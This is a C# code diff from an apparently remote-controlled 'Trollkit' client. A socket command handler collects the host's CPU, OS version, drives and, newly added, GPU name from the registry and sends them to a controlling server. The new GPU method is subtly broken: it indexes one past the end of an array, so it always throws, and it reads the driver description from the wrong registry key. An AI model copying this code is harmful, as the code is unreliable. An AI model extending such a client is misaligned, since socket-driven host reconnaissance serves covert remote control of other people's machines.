@@ -12,10 +12,10 @@ using Trollkit_Library.Modules;
 
 namespace Trollkit_Client.Modules.CommandHandlers
 {
-    class SystemInfoHandler : ICommandHandler
-    {
-        public override bool HandleCommand(Socket s, TransferCommandObject obj)
-        {
+	class SystemInfoHandler : ICommandHandler
+	{
+		public override bool HandleCommand(Socket s, TransferCommandObject obj)
+		{
 			switch (obj.Command)
 			{
 				case "GetClientInfo":
@@ -24,7 +24,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			}
 
 			return false;
-        }
+		}
 
 		private void CollectAndReturnSystemInfo(Socket s)
 		{
@@ -50,14 +50,49 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			TransferCommandObject osVersionTransferObject = new TransferCommandObject { Command = "WindowsVersion", Value = osVersion };
 			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(osVersionTransferObject));
 
-
+			string gpuName = GetGPUName();
+			TransferCommandObject gpuNameTransferObject = new TransferCommandObject { Command = "GPU", Value = gpuName };
+			SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(gpuNameTransferObject));
 
 		}
+
+		private string GetGPUName()
+		{
+			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DEVICEMAP\VIDEO", false);
+			if (key != null)
+			{
+				string notfound = "NotFound";
+				string videoDriverLocation = key.GetValue(@"\Device\Video0", notfound).ToString();
+
+				if (videoDriverLocation != notfound)
+				{
+					string[] splitInfo = videoDriverLocation.Replace(@"\", "|").Split('|');
+
+					string path = $@"SYSTEM\CurrentControlSet\Control\Video\{splitInfo[splitInfo.Length - 1]}\{splitInfo[splitInfo.Length]}";
+
+					RegistryKey key2 = Registry.LocalMachine.OpenSubKey(path, false);
+					if (key2 != null)
+					{
+						string driverDescription = key.GetValue(@"DriverDesc", notfound).ToString();
+						if (driverDescription != notfound)
+						{
+							return driverDescription;
+						}
+						else
+							return "Unkown GPU";
+					}
+				}
+			}
+
+			return "Unknown GPU";
+		}
+
+
 
 		private string GetCPUName()
 		{
 			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0", false);
-			if(key != null)
+			if (key != null)
 			{
 				string processor = key.GetValue("ProcessorNameString", "Unknown Processor").ToString();
 				return processor;
@@ -82,18 +117,18 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			return "Unknown OS Version";
 		}
 
-        private string GetSystemDrives()
-        {
-            string returnString = "Available Drives: ";
-            var drives = DriveInfo.GetDrives();
-            foreach (DriveInfo info in drives)
-            {
-                if (info.IsReady)
-                {
-                    returnString += $"({info.Name.Replace("\\", "")}) ";
-                }
-            }
-            return returnString;
-        }
-    }
+		private string GetSystemDrives()
+		{
+			string returnString = "Available Drives: ";
+			var drives = DriveInfo.GetDrives();
+			foreach (DriveInfo info in drives)
+			{
+				if (info.IsReady)
+				{
+					returnString += $"({info.Name.Replace("\\", "")}) ";
+				}
+			}
+			return returnString;
+		}
+	}
 }
